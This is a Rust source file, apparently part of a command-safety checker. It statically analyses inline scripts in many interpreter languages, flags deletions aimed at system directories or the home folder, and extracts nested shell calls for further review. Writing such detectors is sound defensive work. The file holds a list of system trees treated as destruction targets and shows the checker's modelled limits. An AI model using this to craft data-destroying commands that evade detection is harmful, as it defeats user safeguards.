use nah_proto::ctx::Platform;

use crate::syntax::StaticCallArgument;
use crate::syntax::{
    code_segments, contains_call, lexical_code, lexical_code_cased, lexical_code_exact,
    static_call_arguments_cased,
};
use crate::{Finding, FindingKind, InlineInput, InlineReport, NestedExecution, ProtectionInput};

pub(super) mod protection;

fn lexical_language_code(code: &str, program: &str) -> String {
    if matches!(program, "php" | "powershell" | "pwsh" | "cmd") {
        lexical_code(code, program).0
    } else {
        lexical_code_exact(code, program).0
    }
}

const SYSTEM_TREES: &[&str] = &[
    "/",
    "/bin",
    "/boot",
    "/dev",
    "/etc",
    "/lib",
    "/lib32",
    "/lib64",
    "/proc",
    "/root",
    "/run",
    "/sbin",
    "/sys",
    "/usr",
    "/var",
    "/Library",
    "/System",
    "/private/etc",
    "/private/var",
];
const MAX_ACTIVE_SEGMENTS: usize = 4_096;
const MAX_DEFINITIONS: usize = 128;
const MAX_CALL_CHECKS: usize = 131_072;

#[derive(Clone, Copy, Eq, PartialEq)]
pub(super) enum DefinitionStyle {
    Braces,
    End,
}

pub(super) fn with_protection(
    mut report: InlineReport,
    program: &str,
    input: &InlineInput<'_>,
    protection: Option<&ProtectionInput<'_>>,
) -> InlineReport {
    if let Some(protection) = protection {
        report.extend(protection::analyze(
            program,
            input.code,
            input.home,
            protection.critical_paths,
            input.platform,
            protection.ambient_variables,
        ));
    }
    report
}

pub(super) fn active_segments<'a>(
    code: &'a str,
    program: &str,
    style: DefinitionStyle,
    report: &mut InlineReport,
) -> Vec<&'a str> {
    ordered_active_segments(code, program, style, report)
        .into_iter()
        .filter_map(|segment| segment.executable.then_some(segment.source))
        .collect()
}

pub(super) struct OrderedSegment<'a> {
    pub source: &'a str,
    pub executable: bool,
    pub scope: usize,
    pub state_exact: bool,
}

struct StaticDefinition<'a> {
    name: String,
    body: Vec<&'a str>,
    offset: usize,
    supported: bool,
}

pub(super) fn ordered_active_segments<'a>(
    code: &'a str,
    program: &str,
    style: DefinitionStyle,
    report: &mut InlineReport,
) -> Vec<OrderedSegment<'a>> {
    let mut segments = Vec::new();
    let mut definitions = Vec::<StaticDefinition<'a>>::new();
    let mut definition = None::<StaticDefinition<'a>>;
    let mut dormant = 0isize;
    let mut opened = false;
    let mut uncertain_flow = false;
    let mut state_exact = true;
    for line in code.lines() {
        for line in top_level_statements(line, program) {
            let outside = lexical_language_code(line, program);
            let trimmed = outside.trim_start();
            if dormant == 0 && definition_start(trimmed, program) {
                definition = definition_name(trimmed, program).map(|name| StaticDefinition {
                    supported: definition_is_parameterless(trimmed, program),
                    name,
                    body: Vec::new(),
                    offset: line.as_ptr() as usize - code.as_ptr() as usize,
                });
                segments.push(OrderedSegment {
                    source: line,
                    executable: false,
                    scope: 0,
                    state_exact,
                });
                dormant = 1;
                if style == DefinitionStyle::Braces {
                    let delta = brace_delta(&outside);
                    opened = outside.contains('{');
                    dormant = if opened { delta.max(0) } else { 1 };
                    if let Some(StaticDefinition { body, .. }) = &mut definition
                        && let (Some(start), Some(end)) = (outside.find('{'), outside.rfind('}'))
                        && start < end
                    {
                        body.push(&line[start + 1..end]);
                    }
                    if opened && dormant == 0 {
                        opened = false;
                    }
                }
                if dormant == 0
                    && let Some(definition) = definition.take()
                {
                    definitions.push(definition);
                    if definitions.len() > MAX_DEFINITIONS {
                        report.refuse(crate::InlineRefusal::WorkLimit);
                        return Vec::new();
                    }
                }
                if segments.len() > MAX_ACTIVE_SEGMENTS {
                    report.refuse(crate::InlineRefusal::WorkLimit);
                    return Vec::new();
                }
                continue;
            }
            if dormant > 0 || opened {
                if let Some(StaticDefinition { body, .. }) = &mut definition {
                    body.push(line);
                }
                match style {
                    DefinitionStyle::Braces => {
                        let delta = brace_delta(&outside);
                        if opened {
                            dormant = (dormant + delta).max(0);
                        } else if outside.contains('{') {
                            opened = true;
                            dormant = delta.max(0);
                        }
                        if opened && dormant == 0 {
                            opened = false;
                        }
                    }
                    DefinitionStyle::End => {
                        dormant += end_block_delta(trimmed, program);
                        dormant = dormant.max(0);
                    }
                }
                if dormant == 0
                    && !opened
                    && let Some(definition) = definition.take()
                {
                    definitions.push(definition);
                    if definitions.len() > MAX_DEFINITIONS {
                        report.refuse(crate::InlineRefusal::WorkLimit);
                        return Vec::new();
                    }
                }
                continue;
            }
            uncertain_flow |= unmodeled_control_flow(trimmed, program);
            if uncertain_flow && state_mutation_candidate(trimmed, program) {
                state_exact = false;
            }
            segments.extend(code_segments(line, program).into_iter().map(|source| {
                OrderedSegment {
                    source,
                    executable: !statically_inert_expression(source, program),
                    scope: 0,
                    state_exact,
                }
            }));
            if segments.len() > MAX_ACTIVE_SEGMENTS {
                report.refuse(crate::InlineRefusal::WorkLimit);
                return Vec::new();
            }
        }
    }
    if let Some(definition) = definition {
        definitions.push(definition);
        if definitions.len() > MAX_DEFINITIONS {
            report.refuse(crate::InlineRefusal::WorkLimit);
            return Vec::new();
        }
    }

    let mut next_scope = 1usize;
    let mut scope_stacks = vec![(0usize, Vec::<String>::new())];
    let mut index = 0usize;
    let mut call_checks = 0usize;
    while index < segments.len() {
        if segments[index].executable {
            let mut bodies = Vec::new();
            for definition in &definitions {
                call_checks += 1;
                if call_checks > MAX_CALL_CHECKS {
                    report.refuse(crate::InlineRefusal::WorkLimit);
                    return Vec::new();
                }
                let unique = definitions
                    .iter()
                    .filter(|candidate| candidate.name == definition.name)
                    .count()
                    == 1;
                let segment_offset =
                    segments[index].source.as_ptr() as usize - code.as_ptr() as usize;
                let available = definition.offset < segment_offset
                    || matches!(
                        program,
                        "node" | "nodejs" | "deno" | "bun" | "php" | "perl" | "swift"
                    );
                let stack = scope_stacks
                    .iter()
                    .find(|(scope, _)| *scope == segments[index].scope)
                    .map(|(_, stack)| stack)
                    .expect("segment scope has a call stack");
                let exact_call =
                    contains_zero_argument_call(segments[index].source, program, &definition.name);
                if definition.supported
                    && unique
                    && available
                    && !stack.contains(&definition.name)
                    && exact_call
                {
                    let scope = next_scope;
                    next_scope += 1;
                    let mut nested_stack = stack.clone();
                    nested_stack.push(definition.name.clone());
                    scope_stacks.push((scope, nested_stack));
                    let mut exited = false;
                    let mut uncertain_flow = false;
                    let mut nested_state_exact = segments[index].state_exact;
                    for line in &definition.body {
                        for source in code_segments(line, program) {
                            uncertain_flow |= unmodeled_control_flow(source, program);
                            if uncertain_flow && state_mutation_candidate(source, program) {
                                nested_state_exact = false;
                            }
                            if definition_exit(source, program) {
                                exited = true;
                                break;
                            }
                            bodies.push(OrderedSegment {
                                source,
                                executable: !statically_inert_expression(source, program),
                                scope,
                                state_exact: nested_state_exact,
                            });
                        }
                        if exited {
                            break;
                        }
                    }
                    if !nested_state_exact {
                        for segment in &mut segments[index + 1..] {
                            segment.state_exact = false;
                        }
                    }
                } else if contains_call(
                    &lexical_language_code(segments[index].source, program),
                    &definition.name,
                    true,
                ) {
                    for segment in &mut segments[index + 1..] {
                        segment.state_exact = false;
                    }
                    break;
                }
            }
            if !bodies.is_empty() {
                if segments.len().saturating_add(bodies.len()) > MAX_ACTIVE_SEGMENTS {
                    report.refuse(crate::InlineRefusal::WorkLimit);
                    return Vec::new();
                }
                segments.splice(index + 1..index + 1, bodies);
            }
        }
        index += 1;
    }
    segments
}

pub(super) fn unmodeled_control_flow(source: &str, program: &str) -> bool {
    let outside = lexical_language_code(source, program);
    let source = outside.trim_start();
    let prefixes: &[&str] = match program {
        program if crate::is_python_interpreter(program) => &[
            "if", "elif", "else", "for", "while", "try", "except", "finally", "with", "match",
            "case",
        ],
        "node" | "nodejs" | "deno" | "bun" => {
            &["if", "switch", "for", "while", "do", "try", "catch", "else"]
        }
        "perl" => &["if", "unless", "for", "foreach", "while", "until", "given"],
        "ruby" => &[
            "if", "unless", "case", "for", "while", "until", "begin", "rescue", "ensure",
        ],
        "php" => &[
            "if", "switch", "foreach", "for", "while", "do", "try", "catch", "else",
        ],
        "lua" | "luajit" => &["if", "for", "while", "repeat"],
        "r" | "rscript" => &["if", "for", "while", "repeat", "tryCatch"],
        "julia" => &["if", "for", "while", "try", "catch", "let", "begin"],
        "swift" => &["if", "switch", "for", "while", "repeat", "do", "catch"],
        "powershell" | "pwsh" => &[
            "if", "switch", "foreach", "for", "while", "do", "try", "catch",
        ],
        "cmd" => &["if", "for"],
        _ => &[],
    };
    prefixes
        .iter()
        .any(|prefix| keyword_at_start(source, prefix))
        || matches!(program, "perl" | "ruby")
            && [" if ", " unless ", " while ", " until "]
                .iter()
                .any(|keyword| source.contains(keyword))
}

fn keyword_at_start(source: &str, keyword: &str) -> bool {
    source.strip_prefix(keyword).is_some_and(|rest| {
        rest.chars()
            .next()
            .is_none_or(|character| !character.is_ascii_alphanumeric() && character != '_')
    })
}

pub(super) fn state_mutation_candidate(source: &str, program: &str) -> bool {
    let outside = lexical_language_code(source, program);
    assignment_operator(&outside).is_some()
        || grouped_assignment_candidate(&outside)
        || unmodeled_control_flow(source, program)
            && outside
                .split(['{', '}', ';'])
                .any(|fragment| assignment_operator(fragment).is_some())
        || matches!(program, "r" | "rscript") && outside.contains("->")
        || ["Object.defineProperty(", "setattr(", "rawset("]
            .iter()
            .any(|name| outside.contains(name))
}

fn grouped_assignment_candidate(source: &str) -> bool {
    let source = source.trim();
    source
        .strip_prefix('(')
        .and_then(|source| source.strip_suffix(')'))
        .is_some_and(|source| assignment_operator(source).is_some())
}

fn top_level_statements<'a>(line: &'a str, program: &str) -> Vec<&'a str> {
    let outside = lexical_language_code(line, program);
    let mut depth = 0usize;
    let mut start = 0usize;
    let mut statements = Vec::new();
    for (index, byte) in outside.bytes().enumerate() {
        match byte {
            b'(' | b'[' | b'{' => depth += 1,
            b')' | b']' => depth = depth.saturating_sub(1),
            b'}' => {
                depth = depth.saturating_sub(1);
                let mut next = index + 1;
                while outside
                    .as_bytes()
                    .get(next)
                    .is_some_and(u8::is_ascii_whitespace)
                {
                    next += 1;
                }
                if depth == 0
                    && next < outside.len()
                    && outside.as_bytes().get(next) != Some(&b';')
                    && definition_start(outside[start..=index].trim_start(), program)
                {
                    statements.push(&line[start..index + 1]);
                    start = next;
                }
            }
            b';' if depth == 0 => {
                statements.push(&line[start..index]);
                start = index + 1;
            }
            _ => {}
        }
    }
    statements.push(&line[start..]);
    statements
        .into_iter()
        .filter(|statement| !statement.trim().is_empty())
        .collect()
}

fn statically_inert_expression(source: &str, program: &str) -> bool {
    let outside = lexical_language_code(source, program);
    let source = outside.trim_start();
    if crate::is_python_interpreter(program) {
        return source.starts_with("False and ");
    }
    matches!(program, "node" | "nodejs" | "php" | "ruby" | "swift")
        && source.starts_with("false && ")
}

fn definition_exit(source: &str, program: &str) -> bool {
    let outside = lexical_language_code(source, program);
    let source = outside.trim_start();
    if matches!(program, "node" | "nodejs" | "deno" | "bun") {
        return source == "return"
            || source.starts_with("return ")
            || source == "throw"
            || source.starts_with("throw ");
    }
    source == "return" || source.starts_with("return ")
}

pub(super) fn observe_shadow(state: &mut bool, source: &str, program: &str, expected: &str) {
    *state |= shadowed(source, program, expected);
}

fn definition_start(source: &str, program: &str) -> bool {
    match program {
        "node" | "nodejs" | "deno" | "bun" => {
            source.starts_with("function ")
                || source.starts_with("class ")
                || source.starts_with("if (false)")
                || source.starts_with("if(false)")
                || source.starts_with("while (false)")
                || source.starts_with("while(false)")
        }
        "perl" => source.starts_with("sub "),
        "ruby" => {
            source.starts_with("def ")
                || source.starts_with("class ")
                || source.starts_with("module ")
                || source.starts_with("if false")
                || source.starts_with("while false")
        }
        "php" => {
            source.starts_with("function ")
                || source.starts_with("class ")
                || source.starts_with("if (false)")
                || source.starts_with("if(false)")
                || source.starts_with("while (false)")
                || source.starts_with("while(false)")
        }
        "lua" | "luajit" => {
            source.starts_with("function ")
                || source.contains("= function")
                || source.starts_with("if false")
                || source.starts_with("while false")
        }
        "r" | "rscript" => {
            source.contains("function(")
                || source.contains("function (")
                || source.starts_with("if (FALSE)")
                || source.starts_with("if(FALSE)")
                || source.starts_with("while (FALSE)")
                || source.starts_with("while(FALSE)")
        }
        "julia" => {
            source.starts_with("function ")
                || source.starts_with("macro ")
                || source.starts_with("struct ")
                || source.starts_with("if false")
                || source.starts_with("while false")
        }
        "swift" => {
            source.starts_with("func ")
                || source.starts_with("class ")
                || source.starts_with("struct ")
                || source.starts_with("if false")
                || source.starts_with("while false")
        }
        "powershell" | "pwsh" => {
            source.starts_with("function ")
                || source.starts_with("if ($false)")
                || source.starts_with("while ($false)")
        }
        _ => false,
    }
}

fn definition_name(source: &str, program: &str) -> Option<String> {
    let name = match program {
        "node" | "nodejs" | "deno" | "bun" => source
            .strip_prefix("function ")?
            .split(['(', '{', ' '])
            .next()?,
        "perl" => source.strip_prefix("sub ")?.split(['(', '{', ' ']).next()?,
        "ruby" => source.strip_prefix("def ")?.split(['(', ' ', '<']).next()?,
        "php" => source
            .strip_prefix("function ")?
            .split(['(', '{', ' '])
            .next()?,
        "lua" | "luajit" => source.strip_prefix("function ")?.split(['(', ' ']).next()?,
        "r" | "rscript" => source
            .split_once("<-")
            .or_else(|| source.split_once('='))?
            .0
            .trim(),
        "julia" => source
            .strip_prefix("function ")?
            .split(['(', ' ', '<'])
            .next()?,
        "swift" => source
            .strip_prefix("func ")?
            .split(['(', '{', ' ', '<'])
            .next()?,
        "powershell" | "pwsh" => source
            .strip_prefix("function ")?
            .split(['(', '{', ' '])
            .next()?,
        _ => return None,
    };
    identifier(name).then(|| name.to_owned())
}

fn definition_is_parameterless(source: &str, program: &str) -> bool {
    if program == "ruby" {
        let Some(name) = definition_name(source, program) else {
            return false;
        };
        let rest = source
            .strip_prefix("def ")
            .and_then(|source| source.strip_prefix(&name))
            .unwrap_or_default()
            .trim_start();
        return rest.is_empty()
            || rest
                .strip_prefix('(')
                .and_then(|parameters| parameters.split_once(')'))
                .is_some_and(|(parameters, _)| parameters.trim().is_empty());
    }
    if program == "perl" {
        let Some(name) = definition_name(source, program) else {
            return false;
        };
        let rest = source
            .strip_prefix("sub ")
            .and_then(|source| source.strip_prefix(&name))
            .unwrap_or_default()
            .trim_start();
        return rest.starts_with('{')
            || rest
                .strip_prefix('(')
                .and_then(|parameters| parameters.split_once(')'))
                .is_some_and(|(parameters, _)| parameters.trim().is_empty());
    }
    let parameters = if matches!(program, "r" | "rscript") {
        source
            .find("function")
            .and_then(|start| source[start + "function".len()..].split_once('('))
            .and_then(|(_, rest)| rest.split_once(')'))
            .map(|(parameters, _)| parameters)
    } else {
        source
            .split_once('(')
            .and_then(|(_, rest)| rest.split_once(')'))
            .map(|(parameters, _)| parameters)
    };
    parameters.is_some_and(|parameters| parameters.trim().is_empty())
}

pub(super) fn contains_zero_argument_call(source: &str, program: &str, name: &str) -> bool {
    let (exact_outside, strings, offsets, static_strings, _) = lexical_code_cased(source, program);
    let matching_outside = if matches!(program, "php" | "powershell" | "pwsh" | "cmd") {
        exact_outside.to_ascii_lowercase()
    } else {
        exact_outside.clone()
    };
    static_call_arguments_cased(
        &matching_outside,
        &exact_outside,
        &strings,
        &offsets,
        &static_strings,
        name,
        true,
    )
    .into_iter()
    .any(|arguments| arguments.is_empty())
}

fn brace_delta(source: &str) -> isize {
    source.bytes().fold(0, |depth, byte| match byte {
        b'{' => depth + 1,
        b'}' => depth - 1,
        _ => depth,
    })
}

fn end_block_delta(source: &str, program: &str) -> isize {
    let opens = match program {
        "ruby" => [
            "def ", "class ", "module ", "if ", "unless ", "case ", "begin", "for ", "while ",
            "until ",
        ]
        .iter()
        .filter(|prefix| source.starts_with(**prefix))
        .count(),
        "lua" | "luajit" => ["function ", "if ", "for ", "while ", "do"]
            .iter()
            .filter(|prefix| source.starts_with(**prefix))
            .count(),
        "julia" => [
            "function ",
            "macro ",
            "struct ",
            "if ",
            "for ",
            "while ",
            "let ",
            "begin",
            "try",
        ]
        .iter()
        .filter(|prefix| source.starts_with(**prefix))
        .count(),
        _ => 0,
    } as isize;
    let closes = usize::from(source == "end" || source.starts_with("end ")) as isize;
    opens - closes
}

pub(super) fn exact_string(argument: &StaticCallArgument) -> Option<&str> {
    if argument.strings.len() != 1 || argument.static_strings != [true] {
        return None;
    }
    exact_literal_expression(argument, &argument.outside).then(|| argument.strings[0].as_str())
}

pub(super) fn exact_named_string<'a>(
    argument: &'a StaticCallArgument,
    names: &[&str],
) -> Option<&'a str> {
    if argument.strings.len() != 1 || argument.static_strings != [true] {
        return None;
    }
    let expression = argument_expression(&argument.outside, names)?;
    exact_literal_expression(argument, expression).then(|| argument.strings[0].as_str())
}

fn exact_literal_expression(argument: &StaticCallArgument, expression: &str) -> bool {
    let Some(tokens) = static_tokens(argument, expression) else {
        return false;
    };
    let mut index = 0usize;
    parse_exact_literal(&tokens, &mut index) && index == tokens.len()
}

fn parse_exact_literal(tokens: &[StaticToken], index: &mut usize) -> bool {
    match tokens.get(*index) {
        Some(StaticToken::Literal) => {
            *index += 1;
            true
        }
        Some(StaticToken::OpenParen) => {
            *index += 1;
            parse_exact_literal(tokens, index)
                && tokens.get(*index) == Some(&StaticToken::CloseParen)
                && {
                    *index += 1;
                    true
                }
        }
        _ => false,
    }
}

pub(super) fn exact_code(argument: &StaticCallArgument) -> Option<String> {
    if let Some(value) = exact_string(argument) {
        return Some(value.to_owned());
    }
    let tokens = static_tokens(argument, &argument.outside)?;
    let mut index = 0usize;
    parse_static_expression(&tokens, &mut index)
        .then_some(())
        .filter(|_| index == tokens.len())
        .map(|_| argument.strings.concat())
}

#[derive(Clone, Copy, Eq, PartialEq)]
enum StaticToken {
    Literal,
    OpenParen,
    CloseParen,
    OpenBracket,
    CloseBracket,
    Comma,
    Plus,
}

fn static_tokens(argument: &StaticCallArgument, expression: &str) -> Option<Vec<StaticToken>> {
    if argument.strings.is_empty()
        || !argument.static_strings.iter().all(|exact| *exact)
        || argument.string_offsets.len() != argument.strings.len()
    {
        return None;
    }
    let base = expression.as_ptr() as usize - argument.outside.as_ptr() as usize;
    let end = base.checked_add(expression.len())?;
    if argument
        .string_offsets
        .iter()
        .any(|offset| *offset < base || *offset >= end)
    {
        return None;
    }
    let markers = argument
        .string_offsets
        .iter()
        .map(|offset| offset - base)
        .collect::<Vec<_>>();
    let bytes = expression.as_bytes();
    let mut tokens = Vec::new();
    let mut marker = 0usize;
    let mut index = 0usize;
    while index < bytes.len() {
        if markers.get(marker) == Some(&index) {
            tokens.push(StaticToken::Literal);
            marker += 1;
            index += 1;
            continue;
        }
        match bytes[index] {
            byte if byte.is_ascii_whitespace() => {}
            b'(' => tokens.push(StaticToken::OpenParen),
            b')' => tokens.push(StaticToken::CloseParen),
            b'[' => tokens.push(StaticToken::OpenBracket),
            b']' => tokens.push(StaticToken::CloseBracket),
            b',' => tokens.push(StaticToken::Comma),
            b'+' => tokens.push(StaticToken::Plus),
            _ => return None,
        }
        index += 1;
    }
    (marker == markers.len()).then_some(tokens)
}

fn parse_static_expression(tokens: &[StaticToken], index: &mut usize) -> bool {
    if !parse_static_term(tokens, index) {
        return false;
    }
    while tokens.get(*index) == Some(&StaticToken::Plus) {
        *index += 1;
        if !parse_static_term(tokens, index) {
            return false;
        }
    }
    true
}

fn parse_static_term(tokens: &[StaticToken], index: &mut usize) -> bool {
    match tokens.get(*index) {
        Some(StaticToken::Literal) => {
            *index += 1;
            true
        }
        Some(StaticToken::OpenParen) => {
            *index += 1;
            parse_static_expression(tokens, index)
                && tokens.get(*index) == Some(&StaticToken::CloseParen)
                && {
                    *index += 1;
                    true
                }
        }
        _ => false,
    }
}

pub(super) fn update_static_binding(
    bindings: &mut Vec<(String, String)>,
    segment: &str,
    program: &str,
    allow_static: bool,
) {
    let (outside, strings, _, static_strings, _) = lexical_code_cased(segment, program);
    let mut assignment = outside.trim();
    for prefix in ["const ", "let ", "var ", "local ", "my ", "our ", "state "] {
        if let Some(rest) = assignment.strip_prefix(prefix) {
            assignment = rest;
            break;
        }
    }
    let Some((operator, index, length)) = assignment_operator(assignment) else {
        if state_mutation_candidate(segment, program) {
            bindings.clear();
        }
        return;
    };
    let Some(name) = assigned_identifier(assignment) else {
        bindings.clear();
        return;
    };
    bindings.retain(|(bound, _)| bound != name);
    if allow_static
        && operator == AssignmentOperator::Simple
        && strings.len() == 1
        && static_strings == [true]
        && assignment[index + length..].trim().is_empty()
    {
        bindings.push((name.to_owned(), strings[0].clone()));
    }
}

pub(super) fn assigned_identifier(source: &str) -> Option<&str> {
    let source = ["const ", "let ", "var ", "local ", "my ", "our ", "state "]
        .iter()
        .find_map(|prefix| source.trim_start().strip_prefix(prefix))
        .unwrap_or(source);
    assigned_target(source).and_then(|name| {
        let name = name.trim_start_matches('$');
        identifier(name).then_some(name)
    })
}

fn assigned_target(source: &str) -> Option<&str> {
    let (operator, index, _) = assignment_operator(source)?;
    let mut name = source[..index].trim();
    if operator == AssignmentOperator::Compound {
        name = name.trim_end_matches(|character: char| {
            matches!(
                character,
                '+' | '-' | '*' | '/' | '%' | '.' | '&' | '|' | '^' | '?' | ':'
            )
        });
    }
    Some(name.trim())
}

#[derive(Clone, Copy, Eq, PartialEq)]
enum AssignmentOperator {
    Simple,
    Compound,
}

fn assignment_operator(source: &str) -> Option<(AssignmentOperator, usize, usize)> {
    let bytes = source.as_bytes();
    let mut depth = 0usize;
    for (index, byte) in bytes.iter().copied().enumerate() {
        match byte {
            b'(' | b'[' | b'{' => {
                depth += 1;
                continue;
            }
            b')' | b']' | b'}' => {
                depth = depth.saturating_sub(1);
                continue;
            }
            _ if depth > 0 => continue,
            _ => {}
        }
        if bytes[index..].starts_with(b"<<-") {
            return Some((AssignmentOperator::Compound, index, 3));
        }
        if bytes[index..].starts_with(b"<-") {
            return Some((AssignmentOperator::Simple, index, 2));
        }
        if byte != b'=' {
            continue;
        }
        let previous = index
            .checked_sub(1)
            .and_then(|offset| bytes.get(offset))
            .copied();
        let next = bytes.get(index + 1).copied();
        if matches!(previous, Some(b'=' | b'!' | b'<' | b'>' | b'~'))
            || matches!(next, Some(b'=' | b'>' | b'~'))
        {
            continue;
        }
        let compound = previous.is_some_and(|byte| {
            matches!(
                byte,
                b'+' | b'-' | b'*' | b'/' | b'%' | b'.' | b'&' | b'|' | b'^' | b'?' | b':'
            )
        });
        return Some((
            if compound {
                AssignmentOperator::Compound
            } else {
                AssignmentOperator::Simple
            },
            index,
            1,
        ));
    }
    None
}

fn exact_string_or_binding_named<'a>(
    argument: &'a StaticCallArgument,
    bindings: &'a [(String, String)],
    names: &[&str],
) -> Option<&'a str> {
    exact_named_string(argument, names).or_else(|| {
        if !argument.strings.is_empty() {
            return None;
        }
        let name = argument_expression(argument.outside.trim(), names)?.trim_start_matches('$');
        if !identifier(name) {
            return None;
        }
        bindings
            .iter()
            .rev()
            .find(|(bound, _)| bound == name)
            .map(|(_, value)| value.as_str())
    })
}

fn argument_expression<'a>(outside: &'a str, names: &[&str]) -> Option<&'a str> {
    if names.is_empty() {
        return Some(outside);
    }
    let trimmed = outside.trim();
    if trimmed.is_empty() {
        return Some(outside);
    }
    let positional = trimmed.trim_start_matches('$');
    if identifier(positional) || trimmed.starts_with('[') || trimmed.starts_with('(') {
        return Some(outside);
    }
    let (name, expression) = outside.split_once(['=', ':'])?;
    names
        .iter()
        .any(|expected| name.trim() == *expected)
        .then_some(expression)
}

fn identifier(value: &str) -> bool {
    !value.is_empty()
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
}

pub(super) fn shadowed(code: &str, program: &str, expected: &str) -> bool {
    let case_insensitive = matches!(program, "php" | "powershell" | "pwsh" | "cmd");
    let expected = if case_insensitive {
        expected.to_ascii_lowercase()
    } else {
        expected.to_owned()
    };
    code_segments(code, program).into_iter().any(|segment| {
        let (outside, _, _, _) = if case_insensitive {
            lexical_code(segment, program)
        } else {
            lexical_code_exact(segment, program)
        };
        let source = outside.trim_start();
        let declared = ["def ", "sub ", "function ", "func "]
            .iter()
            .find_map(|prefix| source.strip_prefix(prefix))
            .and_then(|rest| rest.split(['(', '{', ' ', '<']).next());
        if declared == Some(expected.as_str()) {
            return true;
        }
        if program == "ruby" && matches!(expected.as_str(), "system" | "exec") {
            return false;
        }
        assigned_target(source) == Some(expected.as_str())
    })
}

pub(super) fn member_assigned(source: &str, receiver: &str, member: &str) -> bool {
    let target = format!("{receiver}.{member}");
    source.match_indices(&target).any(|(index, _)| {
        let rest = source[index + target.len()..].trim_start();
        rest.starts_with('=') && !rest.starts_with("==")
    })
}

pub(super) fn add_destructive_target(
    report: &mut InlineReport,
    argument: Option<&StaticCallArgument>,
    home: &str,
    platform: Platform,
) {
    add_destructive_target_with_bindings(report, argument, home, platform, &[]);
}

pub(super) fn add_destructive_target_with_bindings(
    report: &mut InlineReport,
    argument: Option<&StaticCallArgument>,
    home: &str,
    platform: Platform,
    bindings: &[(String, String)],
) {
    add_named_destructive_target_with_bindings(report, argument, home, platform, bindings, &[]);
}

pub(super) fn add_named_destructive_target(
    report: &mut InlineReport,
    argument: Option<&StaticCallArgument>,
    home: &str,
    platform: Platform,
    names: &[&str],
) {
    add_named_destructive_target_with_bindings(report, argument, home, platform, &[], names);
}

pub(super) fn add_named_destructive_target_with_bindings(
    report: &mut InlineReport,
    argument: Option<&StaticCallArgument>,
    home: &str,
    platform: Platform,
    bindings: &[(String, String)],
    names: &[&str],
) {
    let Some(target) =
        argument.and_then(|argument| exact_string_or_binding_named(argument, bindings, names))
    else {
        return;
    };
    if target_kind(target, home, platform) == Some(FindingKind::RootDestruction) {
        report.push(Finding::exact(FindingKind::RootDestruction));
    } else if target_kind(target, home, platform) == Some(FindingKind::HomeDestruction) {
        report.push(Finding::exact(FindingKind::HomeDestruction));
    }
}

fn target_kind(target: &str, home: &str, platform: Platform) -> Option<FindingKind> {
    let target = normalized_path(target, platform);
    let home = normalized_path(home, platform);
    if target == home {
        return Some(FindingKind::HomeDestruction);
    }
    SYSTEM_TREES
        .iter()
        .any(|tree| target == normalized_path(tree, platform))
        .then_some(FindingKind::RootDestruction)
}

fn normalized_path(path: &str, platform: Platform) -> String {
    let mut path = path.trim().replace('\\', "/");
    if platform == Platform::Windows {
        path.make_ascii_lowercase();
    }
    let (prefix, rest) = if let Some(rest) = path.strip_prefix('/') {
        ("/".to_owned(), rest)
    } else if platform == Platform::Windows
        && path.as_bytes().get(1) == Some(&b':')
        && path.as_bytes().get(2) == Some(&b'/')
    {
        (path[..3].to_owned(), &path[3..])
    } else {
        return path.trim_end_matches('/').to_owned();
    };
    let mut components = Vec::new();
    for component in rest.split('/') {
        match component {
            "" | "." => {}
            ".." => {
                components.pop();
            }
            _ => components.push(component),
        }
    }
    if components.is_empty() {
        prefix
    } else {
        format!("{prefix}{}", components.join("/"))
    }
}

pub(super) fn add_static_shell_call(
    report: &mut InlineReport,
    arguments: &[StaticCallArgument],
    platform: Platform,
) {
    add_static_shell_call_with_stdout(report, arguments, platform, false, &[], &[]);
}

pub(super) fn add_static_inherited_shell_call(
    report: &mut InlineReport,
    arguments: &[StaticCallArgument],
    platform: Platform,
) {
    add_static_shell_call_with_stdout(report, arguments, platform, true, &[], &[]);
}

fn add_static_shell_call_with_stdout(
    report: &mut InlineReport,
    arguments: &[StaticCallArgument],
    platform: Platform,
    stdout_inherited: bool,
    bindings: &[(String, String)],
    names: &[&str],
) {
    if platform == Platform::Windows {
        return;
    }
    if let Some(code) = arguments
        .first()
        .and_then(|argument| exact_string_or_binding_named(argument, bindings, names))
    {
        push_nested_shell(report, "sh", code, stdout_inherited);
    }
}

pub(super) fn add_static_bound_shell_call(
    report: &mut InlineReport,
    arguments: &[StaticCallArgument],
    platform: Platform,
    stdout_inherited: bool,
    bindings: &[(String, String)],
    names: &[&str],
) {
    add_static_shell_call_with_stdout(
        report,
        arguments,
        platform,
        stdout_inherited,
        bindings,
        names,
    );
}

pub(super) fn add_exact_argv(report: &mut InlineReport, argv: Vec<String>) {
    push_nested_argv(report, argv, false);
}

pub(super) fn add_exact_inherited_argv(report: &mut InlineReport, argv: Vec<String>) {
    push_nested_argv(report, argv, true);
}

pub(super) fn add_exact_shell(report: &mut InlineReport, code: &str, platform: Platform) {
    add_exact_shell_with_stdout(report, code, platform, false);
}

pub(super) fn add_exact_shell_with_stdout(
    report: &mut InlineReport,
    code: &str,
    platform: Platform,
    stdout_inherited: bool,
) {
    if platform != Platform::Windows {
        push_nested_shell(report, "sh", code, stdout_inherited);
    }
}

pub(super) fn exact_argv_argument(argument: &StaticCallArgument) -> Option<Vec<String>> {
    exact_string_array(argument)
        .or_else(|| exact_named_string_array(argument, &["args"]))
        .or_else(|| exact_named_string(argument, &["args"]).map(|value| vec![value.to_owned()]))
}

pub(super) fn add_static_exec_argv_call(
    report: &mut InlineReport,
    arguments: &[StaticCallArgument],
) {
    let Some(program) = arguments.first().and_then(exact_string) else {
        return;
    };
    let Some(argv) = arguments.get(1) else {
        return;
    };
    let mut values = vec![program.to_owned()];
    if let Some(array) = exact_string_array(argv) {
        values.extend(array.into_iter().skip(1));
    } else {
        for argument in arguments.iter().skip(2) {
            let Some(value) = exact_string(argument) else {
                return;
            };
            values.push(value.to_owned());
        }
    }
    push_nested_argv(report, values, true);
}

fn push_nested_shell(report: &mut InlineReport, program: &str, code: &str, stdout_inherited: bool) {
    if code.is_empty() || code.contains('\0') || code.len() > crate::SOURCE_LIMIT {
        return;
    }
    report.push_nested_execution(NestedExecution::Shell {
        program: program.to_owned(),
        code: code.to_owned(),
        stdout_inherited,
    });
}

fn push_nested_argv(report: &mut InlineReport, argv: Vec<String>, stdout_inherited: bool) {
    let bytes = argv.iter().map(String::len).sum::<usize>();
    if argv.first().is_none_or(String::is_empty)
        || argv.iter().any(|value| value.contains('\0'))
        || bytes > crate::SOURCE_LIMIT
    {
        return;
    }
    report.push_nested_execution(NestedExecution::Command {
        argv,
